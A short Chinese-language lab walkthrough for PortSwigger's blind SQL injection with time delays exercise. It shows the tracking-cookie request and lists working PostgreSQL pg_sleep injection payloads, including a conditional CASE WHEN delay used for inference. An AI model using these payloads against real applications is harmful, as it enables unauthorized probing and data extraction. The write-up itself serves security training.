# 实验：具有时间延迟的盲注 SQL 注入

本实验包含一个盲注 SQL 注入漏洞。应用程序使用跟踪 Cookie 进行分析，并执行包含所提交 Cookie 值的 SQL 查询。

SQL 查询的结果不会返回，并且无论查询是否返回任何行或导致错误，应用程序的响应都没有区别。然而，由于查询是同步执行的，因此可以通过触发条件性时间延迟来推断信息。

为了解决本实验，请利用 SQL 注入漏洞导致 10 秒的延迟。

> **提示**
> 你可以在我们的 [SQL 注入速查表](https://portswigger.net/web-security/sql-injection/cheat-sheet) 中找到一些有用的 Payload。

## 步骤

探测
- 访问登录页面
    ```http
    GET /login HTTP/2
    Cookie: TrackingId=qW4uX82ZBAspzubL; session=ayWUH0lpsmzX6gEyEf9ECe3BVBv6eipi
    ```

- 尝试典型的1/2个单引号字符串型 SQLi
    - 无差异

测试
- 尝试时间注入，以下查询均有效
    ```sql
    $input = 'x' AND 1=(SELECT 1 FROM pg_sleep(3)) -- 
    $input = 'x' || pg_sleep(3) --
    $input = 'x' || (SELECT pg_sleep(3)) --
    $input = 'x'; SELECT pg_sleep(3) -- 
    ```

- 尝试条件时间注入
    ```sql
    $input = 'x'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END --
    ```
    - 成功产生差异

- 此处设置10s延迟即通过挑战
